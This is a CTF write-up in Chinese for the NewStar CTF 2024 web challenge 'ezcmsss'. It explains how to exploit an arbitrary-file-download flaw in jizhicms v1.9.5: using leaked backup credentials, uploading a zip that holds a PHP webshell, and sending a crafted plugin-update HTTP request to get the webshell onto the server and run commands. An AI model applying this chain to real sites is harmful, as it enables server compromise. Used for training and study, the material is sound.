# ezcmsss

> 分类：Web

## 题目描述
访问 `/www.zip` 获得源码备份，`readme.txt` 里是 jizhicms v1.9.5，`start.sh` 里有管理员账号密码。jizhicms v1.9.5 存在管理界面任意文件下载漏洞。

## 考察知识点
- 备份文件泄露（www.zip）
- jizhicms v1.9.5 任意文件下载漏洞
- 本地下载解压 getshell（容器不出网）

## 解法
1. 访问 `/www.zip` 得到源码，`readme.txt` 得版本 v1.9.5，`start.sh` 得管理员账号密码，访问 `admin.php` 登录。
2. 插件列表只有一个插件，容器不出网，需把 `.zip` 上传到题目容器，再用任意文件下载漏洞本地下载、解压。
3. 上传方式：**栏目管理 » 栏目列表 » 新增栏目** 添加附件，上传构造好的包含 PHP 马的压缩包。抓包获得保存路径 `/static/upload/file/20241016/1729079175871306.zip`。
4. 构造下载请求：

```http
POST /admin.php/Plugins/update.html HTTP/1.1
Host: eci-2zedm1lw513xbz1d46c6.cloudeci1.ichunqiu.com
Content-Length: 126
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: PHPSESSID=0k7pqbk4chhak4ku5aqbfhe7b3

filepath=apidata&action=start-download&type=0&download_url=http%3a//127.0.0.1/static/upload/file/20241016/1729079175871306.zip
```

5. 修改 `action` 构造解压请求，解压完文件在 `/A/exts`。访问 `/A/exts/shell.php` 进行命令执行。
6. flag 在根目录 `/flllllag`，用通配符 `/fl*` 读取。

## 参考答案
（未给出）

## 来源
- 作者：NewStar CTF 2024 官方 WriteUp | https://newstar.wiki/wp/2024/week4/web/ezcmsss.html
